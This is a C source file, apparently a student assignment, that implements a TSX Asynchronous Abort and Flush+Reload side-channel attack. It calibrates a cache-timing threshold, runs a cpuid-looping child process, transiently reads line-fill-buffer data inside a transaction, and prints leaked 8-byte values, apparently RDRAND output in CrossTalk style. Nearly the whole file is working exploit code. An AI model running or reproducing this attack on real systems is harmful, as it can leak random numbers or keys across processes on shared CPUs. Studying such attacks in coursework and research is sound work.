#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <string.h>
#include <x86intrin.h>   
#include <stdbool.h>
#include "asm.h"        

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 10
#define CONFIDENCE_THRESHOLD 2
#define ROUNDS 100
#define STRIDE 4096    
#define POSSIBLE_BYTES 256
#define BYTES_TO_LEAK 8               
#define RDRAND_OFFSET 32


static uint8_t *leak;
static uint8_t *reloadbuffer;                     
static uint64_t CACHE_THRESHOLD;



uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}



uint64_t get_cache_threshold(){

    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t =measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t=  measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hitt_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hitt_avg) / 2;
 
    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {

    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;

    return delta_t;
}

bool is_equal(unsigned char *a, unsigned char *b, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (a[i] != b[i]) {
            return false;
        }
    }
    return true;
}

int main(void) {

    CACHE_THRESHOLD = get_cache_threshold()* 0.7;

    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);

    // so they can run on the twohyperthreads of the attackerâ€™s physical core
    //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
    pid_t pid = fork();

    // child CPID loop
    if (pid == 0) {
        
        while(1) {
            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet         
        }
        _exit(0);
    }

    size_t leak_len = 4096;
    size_t const mmap_prot = PROT_READ | PROT_WRITE;
    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;

    unsigned char result[BYTES_TO_LEAK];
    unsigned char prev_result[BYTES_TO_LEAK];
    leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
    if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }

    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
    if (reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }

    size_t leaked_values_count = 0;
    unsigned char leaked_values[BYTES_TO_LEAK * 1000] = {0};

    // ===================================================PARENT=======================================================

    while(1) {
        for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
            uint32_t all_hit_bytes[256] = {0};

            for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
                
                // Step 1: flush reload buffer
                for (int i = 0; i < POSSIBLE_BYTES; i++) {
                    clflush(&reloadbuffer[i * STRIDE]);
                }

                clflush(leak + secret_byte);
                sfence();
                clflush(reloadbuffer); // Necessary to cause TAA

                // Step 3: TAA
                if (_xbegin() == _XBEGIN_STARTED)
                {
                    size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
                    *(volatile char*)(reloadbuffer + index);

                    _xend();
                }

                // Step 4: Reload and measure access times
                for(int j=0; j<POSSIBLE_BYTES; j++){
                    uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                    if(reload_time < CACHE_THRESHOLD){
                        all_hit_bytes[j]++;
                        break;
                    }
                }
            }

            // Analyze results to find the most likely byte value
            int max_index = 0;
            int max_hits = 0;
            for(int i = 0; i < 256; i++) {
                int hits = all_hit_bytes[i];

                if(hits > CONFIDENCE_THRESHOLD) {
                    max_index = i;
                    break;
                }

                if(hits > max_hits) {
                    max_index = i;
                    max_hits = hits;
                }
            }

            result[secret_byte - RDRAND_OFFSET] = max_index;
        }

        if (!is_equal(result, prev_result, BYTES_TO_LEAK))
        {
            memcpy(prev_result, result, BYTES_TO_LEAK);
            continue;
        }

        if (leaked_values_count == 0 ||
            !is_equal(result, &leaked_values[(leaked_values_count - 1) * BYTES_TO_LEAK], BYTES_TO_LEAK))
        {
            for (int i = 0; i < BYTES_TO_LEAK; i++) {
                leaked_values[(leaked_values_count) * BYTES_TO_LEAK + i] = result[i];
            }

            ++leaked_values_count;
        }

        printf("Leaked %zu values\n", leaked_values_count);
        for (size_t i = 0; i < leaked_values_count; i++) {
            printf("0x%02x%02x%02x%02x%02x%02x%02x%02x\n", leaked_values[i * BYTES_TO_LEAK], leaked_values[i * BYTES_TO_LEAK + 1], leaked_values[i * BYTES_TO_LEAK + 2], leaked_values[i * BYTES_TO_LEAK + 3], leaked_values[i * BYTES_TO_LEAK + 4], leaked_values[i * BYTES_TO_LEAK + 5], leaked_values[i * BYTES_TO_LEAK + 6], leaked_values[i * BYTES_TO_LEAK + 7]);
        }
    }

    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
    // puts("crosstalk done");
    return 0;
}
